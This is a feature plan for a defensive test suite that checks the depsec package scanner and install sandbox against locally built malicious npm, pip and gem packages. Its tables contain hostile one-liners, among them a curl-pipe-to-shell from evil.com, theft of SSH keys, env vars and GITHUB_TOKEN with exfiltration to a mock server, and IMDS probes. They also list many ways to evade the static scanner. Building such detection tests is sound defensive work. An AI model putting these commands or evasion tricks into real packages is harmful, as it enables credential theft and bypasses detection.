---
title: "feat: Hornets Nest Adversarial Test Suite"
type: feat
date: 2026-04-02
---

# Hornets Nest: Adversarial Test Suite for depsec

## Overview

Build a comprehensive adversarial test suite that stress-tests every layer of depsec — static analysis (`depsec scan`) and runtime protection (`depsec protect`) — using locally-crafted malicious packages. The suite produces a detection matrix scorecard showing exactly what depsec catches and misses.

**Brainstorm:** `docs/brainstorms/2026-04-02-hornets-nest-brainstorm.md`

## Problem Statement

- The benchmark (`scripts/benchmark.sh`) only tests `depsec scan` against the Datadog dataset — patterns were tuned to those samples, so 100% is overfit
- `depsec protect` (sandbox + canary + network monitor + kill chain) has **zero automated adversarial testing**
- No existing tool combines static scan AND runtime sandbox/canary testing in one harness
- Real-world evasion techniques (documented in the brainstorm) have never been tested against depsec

## Proposed Solution

A three-tier test suite in `tests/hornets_nest/` with:
1. **Scan tier** — validates static pattern detection against known malicious code
2. **Protect tier** — validates runtime pipeline (sandbox, canary, network, kill chain) end-to-end
3. **Evasion tier** — tests known blind spots and detects regressions when fixes land

## Technical Approach

### Architecture

```
tests/
  hornets_nest/
    main.rs              # Integration test entry point
    common.rs            # Shared helpers (temp dirs, package builders, assertions)
    mock_server.rs       # TCP/UDP/DNS mock exfil listeners
    scorecard.rs         # Detection matrix scorer + reporter
    scan_tests.rs        # Scan tier tests
    protect_tests.rs     # Protect tier tests
    evasion_tests.rs     # Evasion tier tests
    expected/
      scan.json          # Expected findings per scan package
      protect.json       # Expected verdicts per protect package
      evasion.json       # Expected outcomes (detect/miss/evade)
```

### Key Design Decisions

| Decision | Choice | Rationale |
|---|---|---|
| Invocation model | Shell out via `std::process::Command` + `env!("CARGO_BIN_EXE_depsec")` | Tests the real CLI, no need to restructure crate into lib target |
| Package fixtures | Generated at runtime by builder functions | Avoids committing "malicious" JS that GitHub may flag; keeps repo clean |
| Test parallelism | Scan tests parallel, protect tests serial | Protect tests use sandbox + network monitor that can cross-contaminate |
| Evasion CI behavior | Three-state: detect/miss/evade. Only regressions fail CI | Known gaps are reported, not blocked. Regressions (detect→miss) fail |
| Mock exfil server | Rust TCP/UDP listeners with unique port per test | No external deps (no netcat/socat), CI-compatible |
| Safety guards | All protect/evasion packages check `DEPSEC_TEST=1` env var | Prevents accidental execution of "malicious" code outside test harness |
| Docker tests | Skipped (Docker monitoring is disabled by design) | Not useful to test; would need port mapping changes |
| Supply chain vectors | Deferred — qualitative category, not automated | Lock file poisoning, dep confusion etc. need different test approach |

### Critical Prerequisite: JSON Output for Protect

**Current gap (Q1 from spec analysis):** The sandboxed path in `install_guard.rs` does NOT emit structured JSON for kill chain verdict, canary access, or network observations. Only human-readable stderr. The harness cannot parse results without this.

**Fix:** Add `--json` support to the sandboxed code path that emits:

```json
{
  "verdict": "block",
  "canary_access": [{"path": ".ssh/id_rsa", "status": "tampered"}],
  "network": {
    "expected": ["104.16.6.34:443 (registry.npmjs.org)"],
    "unexpected": ["93.184.216.34:9999"],
    "critical": []
  },
  "file_alerts": [],
  "write_violations": [],
  "exit_code": 0
}
```

### Implementation Phases

#### Phase 0: Prerequisites (do first)

- [x] **P0.1** Add JSON output to sandboxed protect path in `install_guard.rs`
  - Serialize `InstallGuardResult` to stdout when `--format json` is passed
  - Include: verdict, canary_access, network observations, file alerts, exit code
  - File: `src/install_guard.rs` (around line 181-224, after kill chain evaluation)
  - File: `src/commands/protect.rs` (pass format flag through)
- [x] **P0.2** Create `tests/hornets_nest/` directory structure with `main.rs` entry point
- [x] **P0.3** ~~Add `assert_cmd = "2"`~~ Used `env!("CARGO_BIN_EXE_depsec")` + `std::process::Command` instead (simpler)

#### Phase 1: Test Harness Foundation

- [x] **P1.1** `common.rs` — Package builder helpers

  ```rust
  // Builder for scan-tier packages (directory-based)
  pub struct ScanPackageBuilder {
      name: String,
      ecosystem: Ecosystem, // Npm, Pip, Gem
      files: Vec<(String, String)>, // (relative_path, content)
  }

  impl ScanPackageBuilder {
      pub fn npm(name: &str) -> Self;
      pub fn pip(name: &str) -> Self;
      pub fn gem(name: &str) -> Self;
      pub fn file(mut self, path: &str, content: &str) -> Self;
      pub fn build(self) -> TempDir; // Creates node_modules/<name>/ or .venv/... structure
  }

  // Builder for protect-tier packages (with postinstall scripts)
  pub struct ProtectPackageBuilder {
      name: String,
      postinstall: String,   // Shell script content
      files: Vec<(String, String)>,
      mock_server_port: u16, // Where to POST exfiltrated data
  }

  impl ProtectPackageBuilder {
      pub fn npm(name: &str) -> Self;
      pub fn postinstall(mut self, script: &str) -> Self;
      pub fn build(self) -> TempDir; // Creates installable npm package with package.json
  }

  // Assertion helpers
  pub fn assert_finding(output: &str, rule_id: &str); // JSON scan output contains rule
  pub fn assert_no_finding(output: &str, rule_id: &str);
  pub fn assert_verdict(output: &str, expected: &str); // protect JSON has verdict
  pub fn run_scan(dir: &Path, checks: &str) -> String; // Returns JSON stdout
  pub fn run_protect(cmd: &str) -> String; // Returns JSON stdout
  ```

  Directory layout per ecosystem:
  - npm: `<tmpdir>/node_modules/<name>/package.json` + source files
  - pip: `<tmpdir>/.venv/lib/python3.11/site-packages/<name>/` + source files
  - gem: `<tmpdir>/vendor/bundle/ruby/3.2.0/gems/<name>/` + source files

- [x] **P1.2** `mock_server.rs` — Exfil listeners

  ```rust
  pub struct MockTcpServer {
      port: u16,
      received: Arc<Mutex<Vec<Vec<u8>>>>,
      handle: JoinHandle<()>,
  }

  impl MockTcpServer {
      pub fn start() -> Self; // Binds to random available port
      pub fn port(&self) -> u16;
      pub fn received_data(&self) -> Vec<Vec<u8>>;
      pub fn has_connections(&self) -> bool;
  }

  impl Drop for MockTcpServer {
      fn drop(&mut self); // Shutdown listener, join thread
  }

  // Future: MockUdpServer, MockDnsServer for evasion tier
  ```

- [x] **P1.3** `scorecard.rs` — Detection matrix scorer

  ```rust
  pub enum TestOutcome {
      Detect,       // Expected: detect, Actual: detect
      Miss,         // Expected: detect, Actual: miss (REGRESSION)
      Evade,        // Expected: miss, Actual: miss (known gap)
      Surprise,     // Expected: miss, Actual: detect (bonus!)
  }

  pub struct VectorResult {
      id: String,         // e.g. "E01", "N08", "K05"
      name: String,       // e.g. "hn-dynamic-property"
      layer: Layer,       // StaticScan, Sandbox, Network, Canary, KillChain
      expected: Expected, // Detect or Miss
      actual: Actual,     // Detect or Miss
      outcome: TestOutcome,
  }

  pub fn print_scorecard(results: &[VectorResult]);
  // Output:
  //   Static Scan:     14/16 (87.5%)
  //   Network Monitor:  8/14 (57.1%)
  //   ...
  //   [DETECT]  hn-base64-eval        P002 Critical
  //   [MISS]    hn-dynamic-property   E01  High     ← REGRESSION
  //   [EVADE]   hn-dns-exfil          N01  Critical ← known gap
  //   [SURPRISE] hn-proxy-wrap        E02  High     ← bonus detection!
  ```

#### Phase 2: Scan Tier (16 packages)

Each test creates a package with the builder, runs `depsec scan --checks patterns --format json`, and asserts findings.

- [x] **P2.1** Core pattern detection tests (scan/)

  | Package | Rule | Content |
  |---|---|---|
  | `hn-base64-eval` | P002 | `eval(atob("aGVsbG8="))` |
  | `hn-raw-ip-fetch` | P003 | `fetch("http://93.184.216.34/data")` |
  | `hn-credential-read` | P004 | `fs.readFileSync(path.join(os.homedir(), '.ssh/id_rsa'))` |
  | `hn-stego-payload` | P005 | `fs.readFileSync('image.png')` in package with `.png` file |
  | `hn-install-curl` | P006 | `postinstall.sh` with `curl http://evil.com/payload.sh \| sh` |
  | `hn-new-function` | P008 | `new Function(userInput)()` |
  | `hn-imds-probe` | P010 | `fetch("http://169.254.169.254/latest/meta-data/")` |
  | `hn-env-stringify` | P011 | `JSON.stringify(process.env)` |
  | `hn-dynamic-require` | P013 | `require(packageName)` |
  | `hn-char-code-xor` | P014 | `String.fromCharCode(c ^ key)` chain (4+ calls) |
  | `hn-self-destruct` | P015 | `fs.unlinkSync(__filename)` |
  | `hn-obfuscated-hex` | P017 | `function _0x4a2b() { while(!![]) { ... } }` |
  | `hn-node-binding` | P018 | `process.binding('spawn_sync')` |
  | `hn-vm-exec` | P019 | `vm.runInNewContext(untrustedCode)` |
  | `hn-python-subprocess` | P021 (AST) | `subprocess.Popen(cmd, shell=True)` — pip layout |
  | `hn-ruby-system` | P031 (AST) | `` `#{user_input}` `` — gem layout |

- [x] **P2.2** ~~Create `expected/scan.json`~~ Expectations embedded in test code instead (simpler)

  ```json
  {
    "hn-base64-eval": { "expected_rules": ["DEPSEC-P002"], "layer": "static_scan" },
    "hn-credential-read": { "expected_rules": ["DEPSEC-P004"], "layer": "static_scan" }
  }
  ```

- [x] **P2.3** Write `scan_tests.rs` — iterate packages, run scan, assert against expected

#### Phase 3: Protect Tier (7 packages)

Each test creates an installable npm package with a postinstall script, starts a mock server, runs `depsec protect npm install <path> --format json`, and asserts the kill chain verdict.

**Prerequisite:** npm must be available. Tests marked `#[ignore]` if npm not found.

- [ ] **P3.1** Protect package tests

  | Package | Technique | Expected Verdict |
  |---|---|---|
  | `hn-canary-tamper` | postinstall: `echo "pwned" > ~/.ssh/id_rsa` | **Warn** (canary tampered, no network) |
  | `hn-exfiltrator` | postinstall: reads `~/.ssh/id_rsa` + `curl localhost:PORT` | **Block** (canary + network) |
  | `hn-imds-runtime` | postinstall: `curl http://169.254.169.254/` | **Block** (critical IP) |
  | `hn-env-exfil` | postinstall: `node -e "require('http').request({hostname:'localhost',port:PORT,method:'POST'}).end(JSON.stringify(process.env))"` | **Info** (unexpected network, no canary) |
  | `hn-delayed-exec` | postinstall: `node -e "setTimeout(()=>{...exfil...}, 3000)"` | **Block** (if within monitor window) |
  | `hn-clean-exfil` | postinstall: reads `/etc/hostname` + POSTs to mock | **Info** (no canary, unexpected network) |
  | `hn-canary-read-only` | postinstall: `cat ~/.ssh/id_rsa > /dev/null` (read, no modify) | **Pass** (known gap — read-only undetected) |

  All postinstall scripts gated on `DEPSEC_TEST=1`:
  ```bash
  #!/bin/bash
  [ "$DEPSEC_TEST" != "1" ] && exit 0
  # ... actual payload ...
  ```

- [ ] **P3.2** Create `expected/protect.json` mapping each package to expected verdict

- [ ] **P3.3** Write `protect_tests.rs` — serial execution, mock server per test, 30s timeout per test

#### Phase 4: Evasion Tier — Static Scan Evasion (23 packages)

These packages are designed to **bypass** pattern detection. Expected outcome starts as "miss". When we fix a blind spot, we update to "detect" — a regression back to "miss" fails CI.

- [x] **P4.1** Static scan evasion packages (21 evasion vectors implemented)

  **Code-level evasion:**

  | Package | Vector | Code |
  |---|---|---|
  | `hn-dynamic-property` | E01 | `const fs=require('fs'); fs["read"+"File"+"Sync"](p)` |
  | `hn-proxy-wrap` | E02 | `new Proxy(require('fs'), {}).readFileSync(p)` |
  | `hn-import-alias` | E03 | `const r=global.require; r('child_process').exec(cmd)` |
  | `hn-wasm-payload` | E04 | `.wasm` binary + JS loader |
  | `hn-native-addon` | E05 | `binding.gyp` + C stub (doesn't compile, just tests scan) |
  | `hn-multi-file-scatter` | E06 | 3 files: decoder.js, path.js, reader.js — no single trigger |
  | `hn-large-bundle` | E24 | 501KB minified JS with `eval(atob(...))` buried inside |
  | `hn-mainmodule-require` | E08 | `process.mainModule.require('child_process').exec(cmd)` |
  | `hn-reflect-apply` | E09 | `Reflect.apply(require('fs').readFileSync, null, [p])` |
  | `hn-globalthis-eval` | E10 | `globalThis["ev"+"al"](code)` |
  | `hn-dynamic-import` | E15 | `import("child_"+"process").then(m=>m.exec(cmd))` |
  | `hn-indirect-require` | E16 | `(0, require)('child_process').exec(cmd)` |
  | `hn-global-function` | E17 | `new global.Function(code)()` |
  | `hn-alias-function` | E18 | `const Fn=Function; new Fn(code)()` |
  | `hn-create-require` | E19 | `require('module').createRequire(import.meta.url)('child_process')` |
  | `hn-fromcharcode-add` | E20 | `String.fromCharCode(c+k)` (addition, not XOR) — only 2 calls |
  | `hn-pickle-deser` | E21 | `pickle.loads(data)` — Python evasion |
  | `hn-python-alias` | E22 | `import subprocess as sp; sp.Popen(cmd, shell=True)` |
  | `hn-ruby-pipe-open` | E23 | `open("\|#{cmd}")` — Ruby pipe execution |
  | `hn-unicode-homoglyph` | E13 | `evаl(code)` (Cyrillic а looks like Latin a) |
  | `hn-json-payload` | E12 | Payload in `config.json`, loaded with `JSON.parse(readFileSync)` + eval |
  | `hn-getter-exec` | E14 | `Object.defineProperty(x,'y',{get(){require('child_process').exec(cmd)}})` |
  | `hn-pth-persist` | E21b | Python `.pth` file with `exec(base64...)` — no P009 rule exists |

- [x] **P4.2** ~~Create `expected/evasion.json`~~ Expectations embedded in test code (EvasionTest structs)

#### Phase 5: Evasion Tier — Runtime Evasion (24 packages)

- [ ] **P5.1** Sandbox detection evasion

  | Package | Vector | Technique |
  |---|---|---|
  | `hn-detect-home-mismatch` | S01 | Compare `$HOME` vs `getent passwd $(whoami)` |
  | `hn-detect-bwrap` | S02 | Check `/proc/1/cmdline` for `bwrap` |
  | `hn-detect-dockerenv` | S04 | Check `/.dockerenv` existence |
  | `hn-detect-canary-path` | S05 | Check if `$HOME` contains `depsec-canary` |
  | `hn-detect-missing-dirs` | S06 | Check for `.local/share`, `.cache`, browser dirs |
  | `hn-env-steal` | S11 | `node -e "http.post(process.env.GITHUB_TOKEN)"` — env var theft |
  | `hn-staged-trojan` | S10 | postinstall writes trojan to `node_modules/.cache/init.js` |
  | `hn-path-injection` | S09 | Test with project dir containing `"` character |

- [ ] **P5.2** Network monitor evasion

  | Package | Vector | Technique |
  |---|---|---|
  | `hn-dns-exfil` | N01 | `dig base64chunk.localhost` — DNS query exfil |
  | `hn-doh-exfil` | N02 | HTTPS POST to `1.1.1.1/dns-query` |
  | `hn-registry-piggyback` | N03 | POST to `registry.npmjs.org` (allowlisted) |
  | `hn-fast-exfil` | N04 | TCP connect + send + close in <50ms |
  | `hn-unix-socket` | N05 | Write to `/tmp/exfil.sock` |
  | `hn-ipv6-exfil` | N08 | Connect to `[::1]:PORT` (IPv6 localhost) |
  | `hn-udp-exfil` | N13 | UDP datagram to localhost |
  | `hn-ptr-spoof` | N12 | (Documented only — can't spoof PTR in test) |
  | `hn-file-stage` | N09 | Write stolen data to `node_modules/.cache/telemetry.json` |

- [ ] **P5.3** Canary evasion

  | Package | Vector | Technique |
  |---|---|---|
  | `hn-read-no-modify` | C11 | `cat ~/.ssh/id_rsa` — read only, no modify |
  | `hn-non-canary-docker` | C04 | Read `~/.docker/config.json` |
  | `hn-non-canary-kube` | C04 | Read `~/.kube/config` |
  | `hn-env-var-creds` | C07 | `echo $AWS_ACCESS_KEY_ID` |
  | `hn-git-credential` | C08 | `git credential fill` |
  | `hn-stat-mtime` | C02 | `stat ~/.ssh/id_rsa` to detect fresh mtime |
  | `hn-read-restore` | C01 | Read canary, store, write back original |

- [ ] **P5.4** Kill chain logic evasion

  | Package | Vector | Expected |
  |---|---|---|
  | `hn-perfect-evasion` | K05 | Read+restore canary + exfil to expected host → **Pass** |
  | `hn-dns-plus-tamper` | K01 | Tamper canary + DNS exfil (no TCP) → **Warn** (not Block) |
  | `hn-info-verdict-clean` | K06 | Unexpected TCP + no canary → **Info** (reported as clean) |

#### Phase 6: Scorecard and CI Integration

- [ ] **P6.1** Implement `scorecard.rs` with detection matrix output
- [ ] **P6.2** Add test runner that loads expected JSON, runs all tiers, produces scorecard
- [ ] **P6.3** CI configuration:
  - Scan tier + protect tier: `cargo test --test hornets_nest` (must pass)
  - Evasion tier: `cargo test --test hornets_nest -- evasion` (report only, don't fail on known gaps)
  - Regressions (expected=detect, actual=miss): always fail CI
- [ ] **P6.4** Add `scripts/hornets-nest.sh` convenience wrapper that runs all tiers and prints the scorecard
- [ ] **P6.5** Per-test timeout: 30 seconds (configurable via `HORNETS_NEST_TIMEOUT`)

## Acceptance Criteria

### Functional Requirements

- [ ] Scan tier: 16 packages, each testing one specific pattern rule (P001-P031)
- [ ] Protect tier: 7 packages testing the full runtime pipeline with mock exfil server
- [ ] Evasion tier: 47 packages across 5 categories (static, sandbox, network, canary, kill chain)
- [ ] Detection matrix scorecard printed after full run with per-layer percentages
- [ ] Three-state outcome model: DETECT / MISS (regression) / EVADE (known gap)
- [ ] All protect/evasion packages gated on `DEPSEC_TEST=1` safety guard
- [ ] JSON expected files versioned alongside tests

### Non-Functional Requirements

- [ ] Scan tests complete in <30 seconds total (parallel)
- [ ] Protect tests complete in <5 minutes total (serial, 30s timeout each)
- [ ] No external dependencies beyond npm (for protect tier)
- [ ] Works on Linux (bwrap) and macOS (sandbox-exec)
- [ ] Protect tests gracefully skip if npm not available (`#[ignore]`)

### Quality Gates

- [ ] `cargo fmt --check` passes
- [ ] `cargo clippy -- -D warnings` passes
- [ ] `cargo test` passes (existing tests unaffected)
- [ ] `cargo test --test hornets_nest` runs scan + protect tiers successfully
- [ ] Scorecard output is human-readable and CI-parseable

## Risk Analysis & Mitigation

| Risk | Mitigation |
|---|---|
| GitHub flags "malicious" test code | Generate packages at runtime, don't commit JS with eval/exec |
| Protect tests flaky due to timing | Serial execution + 30s timeout + retry logic |
| bwrap not available in CI | Check `which bwrap` and skip sandbox tests if missing |
| npm not installed | `#[ignore]` attribute on protect tests, check in CI setup |
| Canary read-only is fundamental gap | Document as architectural decision, not a bug to fix |
| Mock server port conflicts | Use port 0 (OS-assigned random port) |
| Test cleanup on panic | Use `tempfile::TempDir` (auto-cleanup on drop) + mock server Drop impl |

## Open Questions (from spec analysis)

Resolved with defaults unless user overrides:

| # | Question | Default Resolution |
|---|---|---|
| Q1 | JSON output for protect sandboxed path | **Fix in Phase 0** — prerequisite |
| Q2 | P009 (.pth file) rule doesn't exist | Move `hn-pth-persist` to evasion tier |
| Q3 | Canary read detection filtered out | Track as evasion gap C11, don't change architecture yet |
| Q6 | Evasion failures block CI? | No — only regressions block |
| Q9 | Supply chain 11 vectors | Deferred — qualitative, not in automated suite |
| Q11 | Parallelism strategy | Scan parallel, protect serial |
| Q14 | Per-test timeout | 30 seconds |
| Q15 | Safety guards | `DEPSEC_TEST=1` env var check in all postinstall scripts |

## References

### Internal
- Brainstorm: `docs/brainstorms/2026-04-02-hornets-nest-brainstorm.md`
- Honeypot architecture: `docs/brainstorms/2026-04-01-honeypot-sandbox-architecture.md`
- Sandbox output plan: `docs/plans/2026-04-02-feat-definitive-sandbox-output-plan.md`
- Existing benchmark: `scripts/benchmark.sh`
- Test helpers: `src/checks/patterns.rs:1092-1098` (`setup_dep_file`)
- Kill chain logic: `src/evidence.rs:29-72`
- Canary implementation: `src/canary.rs`
- Network monitor: `src/monitor.rs`

### External (Prior Art)
- [NPM-Threat-Emulation](https://github.com/MHaggis/NPM-Threat-Emulation) — closest existing project
- [OSCAR](https://github.com/security-pride/OSCAR) — dynamic analysis benchmark
- [GuardDog evasion writeup](https://medium.com/@heyyoad/how-we-evaded-datadogs-malicious-package-detection-lessons-for-better-security-e8c9b185f97e)
- [OSC&R framework](https://pbom.dev/) — MITRE ATT&CK for supply chains
- [Ladisa taxonomy](https://arxiv.org/abs/2204.04008) — 107 attack vectors
- [Backstabber's Knife Collection](https://dasfreak.github.io/Backstabbers-Knife-Collection/) — 174 analyzed packages
